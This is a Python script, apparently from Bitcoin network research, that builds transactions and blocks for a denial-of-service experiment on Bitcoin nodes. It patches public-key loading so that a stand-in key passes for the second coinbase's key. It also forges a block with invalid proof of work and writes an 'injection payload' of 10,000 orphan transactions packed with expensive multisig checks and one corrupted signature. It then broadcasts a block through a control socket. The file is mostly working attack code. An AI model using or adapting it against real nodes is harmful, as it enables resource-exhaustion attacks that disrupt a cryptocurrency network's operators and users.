# Create and sign a transaction with a bogus key
from binascii import hexlify, unhexlify
from bitcoin.core import *
from bitcoin.core.key import *
from bitcoin.core.script import *
from bitcoin.core.scripteval import *
from bitcoin import base58
from bitcoin.messages import *

from txtools import Transaction, TxOut, TxIn, tx_from_CTransaction, tx_coinbase

# ethalone keys
#ec_secret = 'a0dc65ffca799873cbea0ac274015b9526505daaaed385155425f7337704883e'
ec_secret = '0C28FCA386C7A227600B2FE50B7CAE11EC86D3BF1FBE471BE89827E19D72AA1D'

def patched_set_pubkey(self, key):
    intercept = map(unhexlify, ['0496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858ee'])
    cheat = unhexlify('04d0de0aaeaefad02b8bdc8a01a1b8b11c696bd3d66a2c5f10780d95b7df42645cd85228a6fb29940e858e7e55842ae2bd115d1ed7cc0e82d934e929c97648cb0a')
    if key in intercept:
        #print 'cheating!'
        key = cheat
    self.mb = ctypes.create_string_buffer(key)
    ssl.o2i_ECPublicKey(ctypes.byref(self.k), ctypes.byref(ctypes.pointer(self.mb)), len(key))

CECKey.set_pubkey = patched_set_pubkey

k = CECKey()
k.set_compressed(True)
k.set_secretbytes(ec_secret.decode('hex'))
#print 'get_privkey:', k.get_privkey().encode('hex')
#print 'get_pubkey:', k.get_pubkey().encode('hex')
# not sure this is needed any more: print k.get_secret().encode('hex')


def txpair_from_pubkey(scriptPubKey=None,nValue=50*1e8):
    """
    returns:
       txout: a txout containing a standard pay-to-pubkey
       sign:  signs the transaction (using an interposed key)
    """
    if scriptPubKey is None:
        # default scriptPubKey, from coinbase #2
        scriptPubKey = CScript(unhexlify('410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac'))
    txout = TxOut(scriptPubKey, nValue)
    def sign(txfrom, ctx, idx):
        sighash = SignatureHash(scriptPubKey, ctx, idx, SIGHASH_ALL)
        sig = k.sign(sighash) + chr(SIGHASH_ALL)
        assert len(sig) < OP_PUSHDATA1
        scriptSig = CScript(chr(len(sig)) + sig)
        # Go ahead and set the scriptSig in the transaction, so we can verify
        ctx.vin[idx].scriptSig = scriptSig
        try: 
            VerifySignature(txfrom, ctx, idx)
        except VerifySignatureError as e:
            print "Warning: signature did not verify"
        return scriptSig
    txin = TxIn(txout, sign)
    return txout, txin

def get_txin_second():
    """
    returns:
       txout: a txout representing the second coinbase
       sign:  signs a transaction spending this input
    """
    second_coinbase = CTransaction.deserialize(unhexlify("01000000010000000000000000000000000000000000000000000000000000000000000000ffffffff0704ffff001d0104ffffffff0100f2052a0100000043410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac00000000"))
    scriptPubKey = CScript(unhexlify('410496b538e853519c726a2c91e61ec11600ae1390813a627c66fb8be7947be63c52da7589379515d4e0a604f8141781e62294721166bf621e73a82cbf2342c858eeac'))
    tx = tx_from_CTransaction(second_coinbase)
    def sign(txfrom, ctx, idx):
        sighash = SignatureHash(scriptPubKey, ctx, idx, SIGHASH_ALL)
        sig = k.sign(sighash) + chr(SIGHASH_ALL)
        assert len(sig) < OP_PUSHDATA1
        scriptSig = CScript(chr(len(sig)) + sig)
        # Go ahead and set the scriptSig in the transaction, so we can verify
        ctx.vin[idx].scriptSig = scriptSig
        try:
            VerifySignature(txfrom, ctx, idx)
        except VerifySignatureError as e:
            print "Warning: signature did not verify"
            print 'idx:', idx
            print '>', txfrom
            print '>', tx
            print
        return scriptSig
    txout = tx._vout[0]
    txin = TxIn(txout, sign)
    return txin


def txpair_from_p2sh(nValue=50*1e8):
    """
    returns:
       txout: a txout containing a standard pay-to-scripthash
       sign:  signs the transaction (using an interposed key)
    """

    # Create a 15 (or 3) way multisig
    n_sigs = 3
    pk = k.get_pubkey()
    redeemscript = CScript([n_sigs] + n_sigs*[pk] + [n_sigs, OP_CHECKMULTISIG])
    redeemscripthash = Hash160(redeemscript)
    scriptPubKey = CScript([OP_HASH160, redeemscripthash, OP_EQUAL])
    txout = TxOut(scriptPubKey, nValue)

    def sign(txfrom, ctx, idx):
        sighash = SignatureHash(redeemscript, ctx, idx, SIGHASH_ALL)
        sigs = [k.sign(sighash) + chr(SIGHASH_ALL) for _ in range(n_sigs)]
        assert len(sigs[0]) < OP_PUSHDATA1
        scriptSig = CScript([OP_0] + sigs + [redeemscript])
        assert len(scriptSig) <= 1650 # This is 1650 for 0.9.3+, but the 0.9.2 limit is 500.
        assert len(scriptSig) <= 500 
        # Go ahead and set the scriptSig in the transaction, so we can verify
        ctx.vin[idx].scriptSig = scriptSig
        # try:
        #     VerifySignature(txfrom, ctx, idx)
        #     VerifyScript(scriptSig, scriptPubKey, ctx, idx, flags=(SCRIPT_VERIFY_P2SH,))
        # except VerifySignatureError as e:
        #     print "Warning: signature did not verify"
        #     print e
        return scriptSig
    txin = TxIn(txout, sign)
    return txout, txin

def txpair_from_p2sh_dos(nValue=50*1e8, n_sigs=3):
    # Create a 15 (or 3) way multisig
    pk = k.get_pubkey()
    redeemscript = CScript([n_sigs] + n_sigs*[pk] + [n_sigs, OP_CHECKMULTISIG])
    redeemscripthash = Hash160(redeemscript)
    scriptPubKey = CScript([OP_HASH160, redeemscripthash, OP_EQUAL])
    txout = TxOut(scriptPubKey, nValue)

    def sign(txfrom, ctx, idx):
        sighash = SignatureHash(redeemscript, ctx, idx, SIGHASH_ALL)
        sigs = [k.sign(sighash) + chr(SIGHASH_ALL) for _ in range(n_sigs)]
        # Corrupt the last sig
        sigs[0] = k.sign(Hash('')) + chr(SIGHASH_ALL)
        scriptSig = CScript([OP_0] + sigs + [redeemscript])
        assert len(scriptSig) <= 1650 # This is 1650 for 0.9.3+, but the 0.9.2 limit is 500.
        assert len(scriptSig) <= 500 
        # Go ahead and set the scriptSig in the transaction, so we can verify
        ctx.vin[idx].scriptSig = scriptSig
        # try:
        #     VerifySignature(txfrom, ctx, idx)
        #     VerifyScript(scriptSig, scriptPubKey, ctx, idx, flags=(SCRIPT_VERIFY_P2SH,))
        # except (VerifySignatureError,VerifyScriptError) as e:
        #     #print "DOS_Check: signature did not verify!"
        #     #print e
        #     pass
        # else:
        #     print "DOS_Check: signature verifies, but was meant to fail"
        return scriptSig
    txin = TxIn(txout, sign)
    return txout, txin


spent_coinbase_134 = "c48b46883778003413636b23233ab90179f7d45a756960858c3f63db517762bb"
def spend_second_coinbase():
    # Create a transaction that spends the second coinbase
    txin_second = get_txin_second()
    tx = Transaction()
    tx.vin = [txin_second]
    #txout, txin = txpair_from_pubkey()
    txout, txin = txpair_from_p2sh()
    tx.append_txout(txout)
    tx.finalize()
    return tx, txin

def void_coinbase(height=0):    
    tx = CTransaction()
    txin = CTxIn()
    txin.scriptSig = chr(0x03) + struct.pack('<I', height)[:3]
    txout = CTxOut()
    txout.nValue = 25*1e8
    txout.scriptPubKey = CScript(unhexlify('76a91427a1f12771de5cc3b73941664b2537c15316be4388ac'))
    tx.vin.append(txin)
    tx.vout.append(txout)
    return tx


def spend_p2sh():
    # First transaction: spends 2nd coinbase, creates a p2sh output
    txin_second = get_txin_second()
    tx1 = Transaction()
    tx1.vin = [txin_second]
    tx1out, tx2in = txpair_from_p2sh()
    tx1.append_txout(tx1out)
    tx1.finalize()

    # Second transaction: spends tx1's output, creates a pubkey output
    tx2 = Transaction()
    tx2.vin = [tx2in]
    tx2out, _ = txpair_from_pubkey(nValue=1*COIN)
    tx2.append_txout(tx2out)
    tx2.finalize()

    return tx1,tx2

def make_block():
    block = CBlock()
    if 0: # Builds on block 120594 on main chain
        prevhash = "0000000000004ba33ad245380d09ed2cf728753421550c23837ac3007ec4c25a"
        nBits = 453031340
        height = 120495
        nTime = 1303963120
        ver = 1
    if 0: # Builds on block 303333 on main chain
        prevhash = "00000000000000005bb3427edaf9b435967c90a490f2b32cfa51f7c32db2397f" # Block 303334 on main chain
        nBits = 409544770
        height = 303335
        nTime = 1401458326
        ver = 2
    if 1:
        prevhash = "00000000000000005bac7c3c745d926451483e7a15ce7a76627861f19f756d22" # Block 302980 on main chain
        nBits = 409544770
        height = 302981
        nTime = 1401257762
        ver = 2
    block.hashPrevBlock = unhexlify(prevhash)[::-1]
    block.vtx.append(void_coinbase(height=height))
    block.nBits = nBits
    block.nNonce = 9999999 # Not a valid proof of work, but this is ok
    block.nTime = nTime
    block.nVersion = ver;
    return block

def block_and_p2sh():
    tx1, tx2 = spend_p2sh()

    block = make_block()
    block.vtx.append(tx1._ctx)
    block.hashMerkleRoot = block.calc_merkle_root()
    return block, tx2


def block_with_spend():
    # Get a first transaction that spends 2nd coinbase to a single output
    tx1,txin = spend_second_coinbase()

    # Create a second transaction that is all fees
    tx2 = Transaction()
    tx2.vin.append(txin)
    txout,_ = txpair_from_pubkey(nValue=1e8)
    tx2.append_txout(txout)
    tx2.finalize()
    
    block = make_block()
    block.vtx.append(tx1._ctx)
    block.hashMerkleRoot = block.calc_merkle_root()
    return block, tx2

def address_from_key(key):
    p = k.get_pubkey()
    pkh = '\x00' + Hash160(p)
    #print 'pkh', pkh
    chk = Hash(pkh)[:4]
    return base58.encode(pkh+chk)

def wif_from_key(key):
    p = k.prikey
    assert len(p) == 32
    p = '\x80' + p #+ '\x01'
    h = Hash(p)
    chk = h[:4]
    return base58.encode(p+chk)

def make_experiment1(path='./experiment1_payload.dat'):
    """
    Creates the injection payload for an experiment.
    This experiment includes a block and a large number of orphans.
    The main payload are transactions that
     - contain the maximum size (100kb)
     - all of the inputs contain the maximum number of ecdsa verifications 

    1. Create enough txouts
    """
    # block, tx2 = block_with_spend()
    # with open(path,'wb') as f:
    #     m = msg_block()
    #     m.block = block
    #     f.write(m.serialize())

    #     m = msg_tx()
    #     m.tx = tx2._ctx
    #     f.write(m.serialize())

    # Chosen so that the size of the payload transactions is within 5kb
    n_inputs = 13

    # 1. Create a setup transaction with enough inputs for each payload (+2 boosters)
    tx_setup = Transaction()
    tx_setup.vin = [get_txin_second()]
    tx_setup_ins = []

    for i in range(n_inputs+2):
        _out,_in = txpair_from_p2sh(nValue=0.01*COIN)
        tx_setup.append_txout(_out)
        tx_setup_ins.append(_in)
    tx_setup.finalize()

    # # 1a. Add tx_setup to a block
    block = make_block()
    block.vtx.append(tx_setup._ctx)
    block.hashMerkleRoot = block.calc_merkle_root()

    # 2. Create a "parent" transaction with one output
    print 'Step 2.'
    tx_parent = Transaction()
    tx_parent.vin = [tx_setup_ins[-2]]
    # This input will be the only invalid one
    _tx_parent_out,tx_parent_in = txpair_from_p2sh_dos(nValue=0.01*COIN)
    tx_parent.append_txout(_tx_parent_out)
    tx_parent.finalize()

    # 3. Create "orphan" payloads
    print 'Step 3.'
    tx_orphans = []
    for i in range(10000):
        # Create several bad transactions
        tx = Transaction()
        tx.vin = tx_setup_ins[:n_inputs-1] + [tx_parent_in]
        txout,_ = txpair_from_p2sh(nValue=0.001*COIN)
        tx.append_txout(txout)
        tx.finalize()
        tx_orphans.append(tx)
        assert len(tx._ctx.serialize()) <= 5000

    with open(path,'wb') as f:
        m = msg_block()
        m.block = block
        f.write(m.serialize())

        for tx in tx_orphans + [tx_parent]:
            m = msg_tx()
            m.tx = tx._ctx
            f.write(m.serialize())

def do_send(sock, msg):
    written = 0
    while (written < len(msg)):
        rv = sock.send(msg[written:], 0)
        if rv > 0:
            written = written + rv
        if rv < 0:
            raise Exception("Error on write (this happens automatically in python?)");
    

if __name__ == '__main__':    
    addr = address_from_key(k)
    #print addr
    
    hash = Hash('Hello, world!')
    #print(k.verify(hash, k.sign(hash)))
    
    tx,txin = spend_second_coinbase()
    #print 'tx:', tx._ctx
    #print 'spend_second_coinbase():', hexlify(tx._ctx.serialize())
    
    blk,tx2 = block_and_p2sh()
    print 'blk:', hexlify(blk.serialize())
    print
    print 'tx2:', hexlify(tx2._ctx.serialize())

    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM, 0)
    #socket.create_connection
    sock.connect("/tmp/bitcoin_control")

    m = msg_block()
    m.block = blk
    cmsg = bitcoin_msg(m.serialize())
    #cmsg = bitcoin_msg("asfalskdfja"*100)
    ser = cmsg.serialize()
    do_send(sock, ser)
    rid = sock.recv(4)
    rid, = unpack('>I', rid)  # message is now saved and can be sent to users with this id
    print "rid is " + str(rid)

    cmsg = command_msg(commands.COMMAND_SEND_MSG, rid, (targets.BROADCAST,))
    ser = cmsg.serialize()
    do_send(sock, ser)

